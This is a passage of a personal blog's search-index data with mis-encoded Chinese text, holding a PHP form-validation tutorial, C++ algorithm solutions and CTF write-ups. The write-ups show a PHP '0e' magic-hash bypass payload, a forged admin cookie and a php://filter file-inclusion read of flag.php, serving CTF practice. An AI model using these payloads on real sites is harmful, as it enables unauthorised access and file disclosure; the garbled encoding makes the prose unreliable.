æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šæˆ– e-mail ä¸­æ˜¯å®‰å…¨çš„ã€‚åœ¨ç”¨æˆ·æäº¤è¯¥è¡¨å•æ—¶ï¼Œæˆ‘ä»¬è¿˜è¦åšä¸¤ä»¶äº‹ï¼šï¼ˆé€šè¿‡ PHP trim() å‡½æ•°ï¼‰å»é™¤ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œï¼‰ï¼ˆé€šè¿‡ PHP stripslashes() å‡½æ•°ï¼‰åˆ é™¤ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­çš„åæ–œæ ï¼ˆ\\ï¼‰æ¥ä¸‹æ¥æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ£€æŸ¥å‡½æ•°ï¼ˆç›¸æ¯”ä¸€ééåœ°å†™ä»£ç ï¼Œè¿™æ ·æ•ˆç‡æ›´å¥½ï¼‰ã€‚æˆ‘ä»¬æŠŠå‡½æ•°å‘½åä¸º test_input()ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡ test_input() å‡½æ•°æ£€æŸ¥æ¯ä¸ª $_POST å˜é‡ï¼Œè„šæœ¬æ˜¯è¿™æ ·çš„ï¼š 1234567891011121314151617181920å®ä¾‹&lt;?php// å®šä¹‰å˜é‡å¹¶è®¾ç½®ä¸ºç©ºå€¼$name = $email = $gender = $comment = $website = \"\";if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; $name = test_input($_POST[\"name\"]); $email = test_input($_POST[\"email\"]); $website = test_input($_POST[\"website\"]); $comment = test_input($_POST[\"comment\"]); $gender = test_input($_POST[\"gender\"]);&#125;function test_input($data) &#123; $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data); return $data;&#125;?&gt; è¯·æ³¨æ„åœ¨è„šæœ¬å¼€å¤´ï¼Œæˆ‘ä»¬æ£€æŸ¥äº†è¡¨å•æ˜¯å¦ä½¿ç”¨ $_SERVER[\"REQUEST_METHOD\"] è¿›è¡Œæäº¤ã€‚å¦‚æœ REQUEST_METHOD æ˜¯ POSTï¼Œé‚£ä¹ˆè¡¨å•å·²è¢«æäº¤ - å¹¶ä¸”åº”è¯¥å¯¹å…¶è¿›è¡ŒéªŒè¯ã€‚å¦‚æœæœªæäº¤ï¼Œåˆ™è·³è¿‡éªŒè¯å¹¶æ˜¾ç¤ºä¸€ä¸ªç©ºç™½è¡¨å•ã€‚ä¸è¿‡ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ‰€æœ‰è¾“å…¥å­—æ®µéƒ½æ˜¯å¯é€‰çš„ã€‚å³ä½¿ç”¨æˆ·æœªè¾“å…¥ä»»ä½•æ•°æ®ï¼Œè„šæœ¬ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œã€‚ä¸‹ä¸€æ­¥æ˜¯åˆ¶ä½œå¿…å¡«è¾“å…¥å­—æ®µï¼Œå¹¶åˆ›å»ºéœ€è¦æ—¶ä½¿ç”¨çš„é”™è¯¯æ¶ˆæ¯ã€‚ å…³äºæ­£åˆ™è¡¨è¾¾å¼ï¼šè®°-æ­£åˆ™è¡¨è¾¾å¼ PHP è¡¨å•éªŒè¯ - éªŒè¯ E-mail å’Œ URLPHP - éªŒè¯åå­—ä»¥ä¸‹ä»£ç å±•ç¤ºçš„ç®€å•æ–¹æ³•æ£€æŸ¥ name å­—æ®µæ˜¯å¦åŒ…å«å­—æ¯å’Œç©ºæ ¼ã€‚å¦‚æœ name å­—æ®µæ— æ•ˆï¼Œåˆ™å­˜å‚¨ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼š 1234$name = test_input($_POST[\"name\"]);if (!preg_match(\"/^[a-zA-Z ]*$/\",$name)) &#123; $nameErr = \"åªå…è®¸å­—æ¯å’Œç©ºæ ¼ï¼\"; &#125; æ³¨é‡Šï¼špreg_match() å‡½æ•°æ£€ç´¢å­—ç¬¦ä¸²çš„æ¨¡å¼ï¼Œå¦‚æœæ¨¡å¼å­˜åœ¨åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ PHP - éªŒè¯ E-mailä»¥ä¸‹ä»£ç å±•ç¤ºçš„ç®€å•æ–¹æ³•æ£€æŸ¥ e-mail 1234$email = test_input($_POST[\"email\"]);if (!preg_match(\"/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/\",$email)) &#123; $emailErr = \"æ— æ•ˆçš„ email æ ¼å¼ï¼\"; &#125; PHP - éªŒè¯ URLä»¥ä¸‹ä»£ç å±•ç¤ºçš„æ–¹æ³•æ£€æŸ¥ URL åœ°å€è¯­æ³•æ˜¯å¦æœ‰æ•ˆï¼ˆè¿™æ¡æ­£åˆ™è¡¨è¾¾å¼åŒæ—¶å…è®¸ URL ä¸­çš„æ–œæ ï¼‰ã€‚å¦‚æœ URL åœ°å€è¯­æ³•æ— æ•ˆï¼Œåˆ™å­˜å‚¨ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼š 12345$website = test_input($_POST[\"website\"]);if (!preg_match(\"/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+&amp;@#\\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\\/%=~_|]/i\",$website)) &#123; $websiteErr = \"æ— æ•ˆçš„ URL\"; &#125; PHP - éªŒè¯ Nameã€E-mailã€ä»¥åŠ URLç°åœ¨ï¼Œè„šæœ¬æ˜¯è¿™æ ·çš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051å®ä¾‹&lt;?php// å®šä¹‰å˜é‡å¹¶è®¾ç½®ä¸ºç©ºå€¼$nameErr = $emailErr = $genderErr = $websiteErr = \"\";$name = $email = $gender = $comment = $website = \"\";if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; if (empty($_POST[\"name\"])) &#123; $nameErr = \"Name is required\"; &#125; else &#123; $name = test_input($_POST[\"name\"]); // æ£€æŸ¥åå­—æ˜¯å¦åŒ…å«å­—æ¯å’Œç©ºæ ¼ if (!preg_match(\"/^[a-zA-Z ]*$/\",$name)) &#123; $nameErr = \"Only letters and white space allowed\"; &#125; &#125; if (empty($_POST[\"email\"])) &#123; $emailErr = \"Email is required\"; &#125; else &#123; $email = test_input($_POST[\"email\"]); // æ£€æŸ¥ç”µé‚®åœ°å€è¯­æ³•æ˜¯å¦æœ‰æ•ˆ if (!preg_match(\"/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/\",$email)) &#123; $emailErr = \"Invalid email format\"; &#125; &#125; if (empty($_POST[\"website\"])) &#123; $website = \"\"; &#125; else &#123; $website = test_input($_POST[\"website\"]); // æ£€æŸ¥ URL åœ°å€è¯­è¨€æ˜¯å¦æœ‰æ•ˆï¼ˆæ­¤æ­£åˆ™è¡¨è¾¾å¼åŒæ ·å…è®¸ URL ä¸­çš„ä¸‹åˆ’çº¿ï¼‰ if (!preg_match(\"/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+&amp;@#\\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\\/% =~_|]/i\",$website)) &#123; $websiteErr = \"Invalid URL\"; &#125; &#125; if (empty($_POST[\"comment\"])) &#123; $comment = \"\"; &#125; else &#123; $comment = test_input($_POST[\"comment\"]); &#125; if (empty($_POST[\"gender\"])) &#123; $genderErr = \"Gender is required\"; &#125; else &#123; $gender = test_input($_POST[\"gender\"]); &#125;&#125;?&gt;","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"CumtCTF2019åä¸ºæ¯","slug":"CumtCTF2019åä¸ºæ¯","date":"2019-09-30T07:38:23.000Z","updated":"2019-12-13T05:35:27.088Z","comments":true,"path":"2019/09/30/CumtCTF2019åä¸ºæ¯/","link":"","permalink":"https://singlemindedt.github.io/2019/09/30/CumtCTF2019åä¸ºæ¯/","excerpt":"","text":"Webç­¾åˆ°é¢˜ç‚¹å¼€é“¾æ¥ä¸ºseedå’Œhashå‚æ•°çš„æäº¤æ¡†ï¼Œå°è¯•adminï¼Œadminï¼Œè¿”å›Failâ€¦;æŸ¥çœ‹å“åº”ï¼Œå‘ç°æœ‰payloadï¼Œæç¤ºè®¿é—®index.php?source=1å‘ç°phpä»£ç : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpfunction gen_secured_random() &#123; // cause random is the way $a = rand(1337,2600)*42; $b = rand(1879,1955)*42; $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b; return $a+$b;&#125;function secured_hash_function($plain) &#123; // cause md5 is the best hash ever $secured_plain = sanitize_user_input($plain); return md5($secured_plain);&#125;function sanitize_user_input($input) &#123; // cause someone told me to never trust user input $re = '/[^a-zA-Z0-9]/';//reä¸ä¸ºa-zA-Z0-9 $secured_input = preg_replace($re, \"\", $input); //preg_replaceå‡½æ•°ï¼ˆæœç´¢inputä¸­ç¬¦åˆreæ­£åˆ™çš„å†…å®¹ç”¨â€œ â€ä»£æ›¿ï¼Œå³å»é™¤ä¸æ˜¯a-zA-Z0-9ï¼‰ return $secured_input;&#125;/*&lt;?php // cause someone told me to never trust user input $input='&lt;&lt;&lt;&gt;&gt;&gt;.AZ.,,assddf23232????'; $re = '/[^a-zA-Z0-9]/';//reä¸ä¸ºa-zA-Z0-9 $secured_input = preg_replace($re, \"\", $input); //preg_replaceå‡½æ•°ï¼ˆæœç´¢inputä¸­ç¬¦åˆreæ­£åˆ™çš„å†…å®¹ç”¨â€œ â€ä»£æ›¿ï¼Œå³å»é™¤éa-zA-Z0-9ï¼‰ echo $secured_input; ?&gt; run:AZassddf23232*/if (isset($_GET['source'])) &#123; show_source(__FILE__); die();&#125;require_once \"secret.php\";if (isset($_POST['s']) &amp;&amp; isset($_POST['h'])) &#123;//è¾“å…¥s,h //issetåœ¨phpä¸­ç”¨æ¥åˆ¤æ–­å˜é‡æ˜¯å¦å£°æ˜ï¼Œè¯¥å‡½æ•°è¿”å›å¸ƒå°”ç±»å‹çš„å€¼ï¼Œå³true/falseã€‚ //issetåªèƒ½ç”¨äºå˜é‡ï¼Œå› ä¸ºä¼ é€’ä»»ä½•å…¶å®ƒå‚æ•°éƒ½å°†é€ æˆè§£æé”™è¯¯ $s = sanitize_user_input($_POST['s']);//s=è¾“å…¥s $h = secured_hash_function($_POST['h']);//h=MD5ï¼ˆhï¼‰ $r = gen_secured_random();//r=éšæœºæ•° if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) //å¼±ç±»å‹æ¯”è¾ƒ &#123;//è¿æ¥så’Œrï¼Œå³ï¼šç”¨æˆ·è¾“å…¥s+éšæœºæ•°==ç”¨æˆ·è¾“å…¥h //*****æ­¤å¤„åˆ©ç”¨0eæ¼æ´ï¼Œå³0e+r==(å¡«å†™hashä¸º0å¼€å¤´å­—ç¬¦) print \"Well done! Here is your flag: \".$flag; &#125; else &#123; print \"Fail...\"; &#125; &#125; else &#123; print \"&lt;p&gt;Hum ...&lt;/p&gt;\"; &#125;&#125;?&gt; æ„é€ postä¼ å€¼ï¼š 1s=0e1&amp;h=QNKCDZO&amp;submit=Check Miscä¸¤å²åŠçš„çŒªæ‰“å¼€å‹ç¼©åŒ…ä¸ºä¸‰åªçŒªpngï¼Œåˆ©ç”¨stegsolveå‘ä¸‹æœ‰äºŒç»´ç ï¼› å¯»æ‰¾ä½ çš„Keyå¾—åˆ°å‹ç¼©åŒ…ï¼Œè§£å‹å‘ç°éœ€è¦å¯†ç ï¼Œç”¨binwalkæ–‡ä»¶åˆ†ç¦»ï¼Œå¾—åˆ°å¦å¤–ä¸€ä¸ªå‹ç¼©åŒ…0.zipå’ŒkEy.exeå°†kEy.exeæ”¾è¿›winhex,å¾—åˆ°é€†åºå›¾ç‰‡base64ç¼–ç é€†åºç¼–ç ï¼Œè½¬å›¾ç‰‡ï¼Œå¾—åˆ°äºŒç»´ç  å§”å±ˆçš„å…”å…”å°†å›¾ç‰‡æ‹–å…¥winhexï¼Œå¾—åˆ°Unicode ç¼–ç ï¼Œç›´æ¥ç™¾åº¦è§£ç å¾—åˆ° flag 302ï¼Ÿè¿˜æœ‰å…¶ä»–ï¼Ÿçœ‹åˆ°302ï¼ŒæŠ“åŒ…ï¼Œå‘ç°å­˜åœ¨1ndex.php,è®¿é—®1ndex.phpå‘ç°RAWä¸­æœ‰keyå’Œbase64ç¼–ç åçš„pngå›¾ç‰‡ï¼Œè½¬å›¾ç‰‡ï¼Œæ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼Œç›´æ¥ç«™é•¿å·¥å…·è§£å¯†å¸¦éšè—ä¿¡æ¯çš„å›¾ç‰‡ï¼Œè¾“å…¥keyï¼Œå¾—åˆ°flagï¼›ï¼ˆæ­¤å¤„åšä¸€è¡¥å……ï¼Œå½“æ—¶åˆ©ç”¨binwalk -eåˆ†ç¦»æ–‡ä»¶å¾—åˆ°ä¸€ä¸ªç©ºæ–‡æœ¬æ–‡ä»¶å’Œä¸€ä¸ªzlibæ–‡ä»¶ï¼Œåˆ©ç”¨è„šæœ¬è§£å¯†zlibæ–‡ä»¶åº”è¯¥ä¹Ÿèƒ½æˆåŠŸï¼Œä¸è¿‡å½“æ—¶æœªè·‘å‡ºæ¥ï¼‰","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"}]},{"title":"æš´è·³è€æ¿+Flagåœ¨å“ªï¼Ÿ+ç¾å‘³é¥¼å¹²","slug":"æš´è·³è€æ¿","date":"2019-09-25T14:49:02.000Z","updated":"2019-12-18T00:07:02.689Z","comments":true,"path":"2019/09/25/æš´è·³è€æ¿/","link":"","permalink":"https://singlemindedt.github.io/2019/09/25/æš´è·³è€æ¿/","excerpt":"","text":"æš´è·³è€æ¿éšä¾¿è¾“å…¥å†…å®¹ï¼Œå¾—åˆ°å¼¹çª—è¦ä»¥POSTæ–¹å¼ç”¨Dearå‘é‚®ä»¶ï¼ŒæŠ“åŒ…ï¼š ç›´æ¥åœ¨postTextåæ·»åŠ Dear=MyBossï¼Œå‘åŒ…å¾—åˆ°flag Flagåœ¨å“ªï¼ŸburpsuitæŠ“åŒ…ï¼Œå‘ç°æœ‰äº”ä¸ªè·³è½¬é¡µé¢ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰flag:)/where_is_flag.php/flag.php/I_have_a_frog.php/I_have_a_flag.php/no_flag.phpçœ‹çœ‹å¤§ä½¬ä»¬éªšæ“ä½œï¼Œè¦ç»„åˆä¸€ä¸‹ orz ï¼Œflagfrog.php,å‘åŒ…å¾—åˆ°flagã€‚ ç¾å‘³çš„é¥¼å¹²ç‚¹å‡»é“¾æ¥å¾—åˆ°ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå°è¯•adminï¼Œ111æç¤ºâ€œç™»å½•æˆåŠŸï¼Œæ¬¢è¿adminï¼â€ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚æŸ¥çœ‹æºä»£ç ï¼Œæç¤ºâ€œåªæœ‰adminæ‰æœ‰flagâ€ã€‚æ£€æŸ¥è¯·æ±‚å¤´ï¼Œæœ‰å¯ç–‘Cookieï¼š 1login=ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D base64è§£ç ï¼š 1ee11cbb19052e40b07aac0ca060c23ee MD5è§£ç ï¼šuser é‚£ä¹ˆæ„æ€åŸºæœ¬å°±æ¸…æ¥šäº†ï¼Œåº”è¯¥æ˜¯è¦Cookieä¿¡æ¯ä¸ºadminï¼Œæ‰èƒ½å¤Ÿå¾—åˆ°flag adminMD5ï¼š 121232f297a57a5a743894a0e4a801fc3 base64: 1MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM= æ›´æ”¹Cookieï¼Œé‡å‘ï¼Œåœ¨å“åº”é‡Œçœ‹åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"æœ€å¤§å­æ®µå’Œ","slug":"æœ€å¤§å­æ®µå’Œ","date":"2019-09-24T14:18:31.000Z","updated":"2019-09-24T14:22:04.803Z","comments":true,"path":"2019/09/24/æœ€å¤§å­æ®µå’Œ/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/æœ€å¤§å­æ®µå’Œ/","excerpt":"","text":"é—®é¢˜Dï¼šæœ€å¤§å­æ®µå’Œé¢˜ç›®æè¿°ç»™å®šn ä¸ªæ•´ä½“ç»„æˆçš„åºåˆ—a1ï¼Œa2ï¼Œâ€¦ anï¼Œæ±‚å­æ®µå’Œa i + a i + 1 + â€¦ + a jï¼ˆå­æ®µå¯ä¸ºç©ºé›†ï¼‰çš„æ›¿ä»£ã€‚ è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ•´æ•°Tï¼ˆ1 &lt;= T &lt;= 20ï¼‰ï¼Œä»£è¡¨æµ‹è¯•æ•°æ®ä¸ªæ•°ã€‚ æ¯ç»„æµ‹è¯•æ•°æ®ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ•´æ•°n ï¼Œä»£è¡¨æœ‰n ä¸ªæ•´æ•°ï¼ˆ1 &lt;= n &lt;= 10000ï¼‰ã€‚ æ¥ä¸‹æ¥ä¸€è¡Œæœ‰n ä¸ªæ•°xï¼ˆ-1000 &lt;= x &lt;= 1000ï¼‰ã€‚ è¾“å‡ºè¾“å‡ºå…¶å¯¹åº”çš„æœ€å¤§å­æ®µå’Œã€‚ æ ·ä¾‹è¾“å…¥123162 -11 4 13 -1 2 æ ·ä¾‹è¾“å‡º118 æç¤ºå­æ®µå¯ä¸ºç©ºé›†ï¼Œç­”æ¡ˆä¸º0 ä»£ç ï¼š12345678910111213141516171819202122232425262728#include&lt;iostream&gt;using namespace std;int maxsum(int b[],int n)&#123; int tempsum=0; int Maxsum=0; for(int i=0;i&lt;n;i++) &#123; tempsum=(tempsum+b[i])&gt;b[i]?(tempsum+b[i]):b[i]; if(tempsum&gt;Maxsum) Maxsum=tempsum; &#125; return Maxsum;&#125;int main()&#123; int T; int n; while(cin&gt;&gt;T&gt;&gt;n) &#123; int a[10000]=&#123;0&#125;; for(int i=0;i&lt;n;i++) cin&gt;&gt;a[i]; int SUM=maxsum(a,n); cout&lt;&lt;SUM&lt;&lt;endl; return 0; &#125;&#125;","categories":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/categories/ç®—æ³•/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/tags/ç®—æ³•/"},{"name":"åŠ¨æ€è§„åˆ’","slug":"åŠ¨æ€è§„åˆ’","permalink":"https://singlemindedt.github.io/tags/åŠ¨æ€è§„åˆ’/"}]},{"title":"æ±½æ°´ç“¶","slug":"æ±½æ°´ç“¶","date":"2019-09-24T09:41:42.000Z","updated":"2019-09-24T14:16:32.134Z","comments":true,"path":"2019/09/24/æ±½æ°´ç“¶/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/æ±½æ°´ç“¶/","excerpt":"","text":"é—®é¢˜ E: æ±½æ°´ç“¶ã€25ã€‘é¢˜ç›®æè¿°æœ‰è¿™æ ·ä¸€é“æ™ºåŠ›é¢˜ï¼šâ€œæŸå•†åº—è§„å®šï¼šä¸‰ä¸ªç©ºæ±½æ°´ç“¶å¯ä»¥æ¢ä¸€ç“¶æ±½æ°´ã€‚å°å¼ æ‰‹ä¸Šæœ‰åä¸ªç©ºæ±½æ°´ç“¶ï¼Œå¥¹æœ€å¤šå¯ä»¥æ¢å¤šå°‘ç“¶æ±½æ°´å–ï¼Ÿâ€ç­”æ¡ˆæ˜¯5ç“¶ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼šå…ˆç”¨9ä¸ªç©ºç“¶å­æ¢3ç“¶æ±½æ°´ï¼Œå–æ‰3ç“¶æ»¡çš„ï¼Œå–å®Œä»¥å4ä¸ªç©ºç“¶å­ï¼Œç”¨3ä¸ªå†æ¢ä¸€ç“¶ï¼Œå–æ‰è¿™ç“¶æ»¡çš„ï¼Œè¿™æ—¶å€™å‰©2ä¸ªç©ºç“¶å­ã€‚ç„¶åä½ è®©è€æ¿å…ˆå€Ÿç»™ä½ ä¸€ç“¶æ±½æ°´ï¼Œå–æ‰è¿™ç“¶æ»¡çš„ï¼Œå–å®Œä»¥åç”¨3ä¸ªç©ºç“¶å­æ¢ä¸€ç“¶æ»¡çš„è¿˜ç»™è€æ¿ã€‚å¦‚æœå°å¼ æ‰‹ä¸Šæœ‰nä¸ªç©ºæ±½æ°´ç“¶ï¼Œæœ€å¤šå¯ä»¥æ¢å¤šå°‘ç“¶æ±½æ°´å–ï¼Ÿ è¾“å…¥è¾“å…¥æ–‡ä»¶æœ€å¤šåŒ…å«10ç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ä¸ªæ•°æ®å ä¸€è¡Œï¼Œä»…åŒ…å«ä¸€ä¸ªæ­£æ•´æ•°n(1â‰¤nâ‰¤100)ï¼Œè¡¨ç¤ºå°å¼ æ‰‹ä¸Šçš„ç©ºæ±½æ°´ç“¶æ•°ã€‚n=0è¡¨ç¤ºè¾“å…¥ç»“æŸï¼Œä½ çš„ç¨‹åºä¸åº”å½“å¤„ç†è¿™ä¸€è¡Œã€‚ è¾“å‡ºå¯¹äºæ¯ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å‡ºä¸€è¡Œï¼Œè¡¨ç¤ºæœ€å¤šå¯ä»¥å–çš„æ±½æ°´ç“¶æ•°ã€‚å¦‚æœä¸€ç“¶ä¹Ÿå–ä¸åˆ°ï¼Œè¾“å‡º 0 æ ·ä¾‹è¾“å…¥1234310810 æ ·ä¾‹è¾“å‡º1231540 ä»£ç ï¼š```C++ #includeusing namespace std;int main(){ int n=0; while(cin&gt;&gt;n) { int m=0;//æœ€å¤šå¯å– if(n==0) { continue; } if(n==2)//ç¬¬ä¸€æ¬¡å¿˜äº†è¿™ä¸ªåˆæ¬¡n=2çš„æƒ…å†µ { cout&lt;&lt;1&lt;&lt;endl; continue;//æ­¤å¤„è‹¥æ— ä¼šå¤šè¾“å‡º 0 } else while(n&gt;2) { int bn=n; n=n/3+n%3; m+=bn/3; if(n==2) { m++; break; } } cout&lt;&lt;m&lt;&lt;endl; } return 0;}/*ç”±è§„å¾‹å¯å¾—å¦‚ä¸‹æ–¹æ³•ï¼š #includeusing namespace std;int main(){int num = 0; while (cin&gt;&gt;num) if (num == 0) continue; else cout&lt;&lt;num/2&lt;&lt;endl;//éƒ½æ˜¯æ•´é™¤ç»“æœ return 0;}*/","categories":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/categories/ç®—æ³•/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/tags/ç®—æ³•/"}]},{"title":"æœ€é•¿å…¬å…±å­åºåˆ—","slug":"æœ€é•¿å…¬å…±å­åºåˆ—","date":"2019-09-24T08:02:54.000Z","updated":"2019-09-24T08:07:31.137Z","comments":true,"path":"2019/09/24/æœ€é•¿å…¬å…±å­åºåˆ—/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/æœ€é•¿å…¬å…±å­åºåˆ—/","excerpt":"","text":"é—®é¢˜ A: æœ€é•¿å…¬å…±å­åºåˆ—æ—¶é—´é™åˆ¶: 1 Sec å†…å­˜é™åˆ¶: 32 MB é¢˜ç›®æè¿°ç»™ä½ ä¸€ä¸ªåºåˆ—Xå’Œå¦ä¸€ä¸ªåºåˆ—Zï¼Œå½“Zä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½åœ¨Xä¸­å­˜åœ¨ï¼Œå¹¶ä¸”åœ¨Xä¸­çš„ä¸‹æ ‡é¡ºåºæ˜¯ä¸¥æ ¼é€’å¢çš„ï¼Œé‚£ä¹ˆå°±æŠŠZå«åšXçš„å­åºåˆ—ã€‚ä¾‹å¦‚ï¼šZ=&lt;a,b,f,c&gt;æ˜¯åºåˆ—X=&lt;a,b,c,f,b,c&gt;çš„ä¸€ä¸ªå­åºåˆ—ï¼ŒZä¸­çš„å…ƒç´ åœ¨Xä¸­çš„ä¸‹æ ‡åºåˆ—ä¸º&lt;1,2,4,6&gt;ã€‚ç°ç»™ä½ ä¸¤ä¸ªåºåˆ—Xå’ŒYï¼Œè¯·é—®å®ƒä»¬çš„æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦æ˜¯å¤šå°‘ï¼Ÿ è¾“å…¥è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„è¾“å…¥å ä¸€è¡Œï¼Œä¸ºä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç”±è‹¥å¹²ä¸ªç©ºæ ¼åˆ†éš”ã€‚æ¯ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸è¶…è¿‡100ã€‚ è¾“å‡ºå¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²çš„æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦ã€‚ æ ·ä¾‹è¾“å…¥123abcfbc abfcabprogramming contest abcd mnp æ ·ä¾‹è¾“å‡º123420 ä»£ç ï¼š 12345678910111213141516171819202122#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; string x; string z; int dp[105][105] =&#123;0&#125;; while(cin&gt;&gt;x&gt;&gt;z) &#123; int len1 = x.size();//8 int len2 = z.size();//9 for(int i =1; i &lt;= len1; i++) for(int j =1; j &lt;=len2; j++) if(x[i-1]==z[j-1])//i,j&gt;0,xi=zj dp[i][j] =dp[i - 1][j - 1] + 1; else dp[i][j]= max(dp[i][j-1], dp[i-1][j]);//i,j&gt;0,xi!=yj cout&lt;&lt;dp[len1][len2]&lt;&lt;endl; &#125; return 0;&#125;","categories":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/categories/ç®—æ³•/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/tags/ç®—æ³•/"},{"name":"åŠ¨æ€è§„åˆ’","slug":"åŠ¨æ€è§„åˆ’","permalink":"https://singlemindedt.github.io/tags/åŠ¨æ€è§„åˆ’/"}]},{"title":"æ–‡ä»¶åŒ…å«æ¼æ´","slug":"æ–‡ä»¶åŒ…å«æ¼æ´","date":"2019-09-23T16:13:50.000Z","updated":"2019-09-23T16:23:38.411Z","comments":true,"path":"2019/09/24/æ–‡ä»¶åŒ…å«æ¼æ´/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/æ–‡ä»¶åŒ…å«æ¼æ´/","excerpt":"","text":"php://filterï¼ˆæœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–ï¼‰å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚ ç”¨æ³•ï¼š 123?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php ä¸€æ ·ã€‚ æ¡ä»¶ï¼šåªæ˜¯è¯»å–ï¼Œéœ€è¦å¼€å¯ allow_url_fopenï¼Œä¸éœ€è¦å¼€å¯ allow_url_includeï¼› MOCTFä¸Šè¿™é“æ–‡ä»¶åŒ…å«é¢˜ï¼Œç›´æ¥ 1?file=php://filter/convert.base64-encode/resource=flag.php å¾—åˆ°ä¸€ä¸²base64ç¼–ç è§£ç å¾—åˆ°flag å…³äºæ–‡ä»¶åŒ…å«æ¼æ´","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"}]},{"title":"NewsCenter","slug":"æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-NewsCenter","date":"2019-09-10T15:45:00.000Z","updated":"2019-12-30T05:41:24.198Z","comments":true,"path":"2019/09/10/æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-NewsCenter/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-NewsCenter/","excerpt":"","text":"NewsCenteré¢˜ç›®åˆ†æï¼šæ‰“å¼€é“¾æ¥ï¼Œå‡ºç°å¦‚ä¸‹é¡µé¢ï¼š[N1]:(https://dev.tencent.com/u/Single-minded_T/p/Si